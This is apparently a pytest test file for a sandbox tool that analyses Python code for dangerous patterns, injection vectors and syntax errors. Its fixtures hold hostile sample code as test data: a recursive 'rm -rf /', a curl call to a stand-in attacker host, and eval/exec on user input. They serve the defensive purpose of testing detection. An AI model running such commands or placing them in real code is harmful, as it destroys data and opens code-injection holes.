"""Tests for sandbox code analysis tools."""

import pytest
from loom.tools import sandbox


@pytest.mark.asyncio
async def test_sandbox_analyze_safe_code():
    """Test analysis of safe Python code."""
    safe_code = """
def greet(name):
    return f"Hello, {name}!"

result = greet("World")
"""
    result = await sandbox.research_sandbox_analyze(safe_code)
    
    assert result["syntax_valid"] is True
    assert result["classification"] == "safe"
    assert result["risk_score"] == 0.0
    assert result["safe_to_execute"] is True
    assert len(result["dangerous_patterns"]) == 0


@pytest.mark.asyncio
async def test_sandbox_analyze_dangerous_code():
    """Test detection of dangerous patterns."""
    dangerous_code = """
import subprocess
import os
subprocess.run(["rm", "-rf", "/"])
os.system("curl http://attacker.com")
eval(user_input)
"""
    result = await sandbox.research_sandbox_analyze(dangerous_code)
    
    assert result["syntax_valid"] is True
    assert result["safe_to_execute"] is False
    assert result["risk_score"] > 5.0
    assert len(result["dangerous_patterns"]) > 0
    assert any("eval" in p["description"] for p in result["dangerous_patterns"])


@pytest.mark.asyncio
async def test_sandbox_analyze_syntax_error():
    """Test syntax error detection."""
    invalid_code = "def broken_function("
    result = await sandbox.research_sandbox_analyze(invalid_code)
    
    assert result["syntax_valid"] is False
    assert result["syntax_error"] is not None


@pytest.mark.asyncio
async def test_sandbox_report_injection_vectors():
    """Test security report includes injection vectors."""
    code_with_injection = "eval(input('code: '))"
    report = await sandbox.research_sandbox_report(code_with_injection)
    
    assert "injection_vectors" in report
    assert len(report["injection_vectors"]) > 0
    assert report["safe_to_execute"] is False


@pytest.mark.asyncio
async def test_sandbox_report_recommendations():
    """Test that reports include actionable recommendations."""
    bad_code = "exec(user_data)"
    report = await sandbox.research_sandbox_report(bad_code)
    
    assert "recommendations" in report
    assert len(report["recommendations"]) > 0
    assert any("Do not execute" in rec for rec in report["recommendations"])


@pytest.mark.asyncio
async def test_sandbox_unsupported_language():
    """Test graceful error for unsupported languages."""
    result = await sandbox.research_sandbox_analyze(
        "console.log('test')", 
        language="javascript"
    )
    
    assert "error" in result
    assert "unsupported" in result["error"].lower()
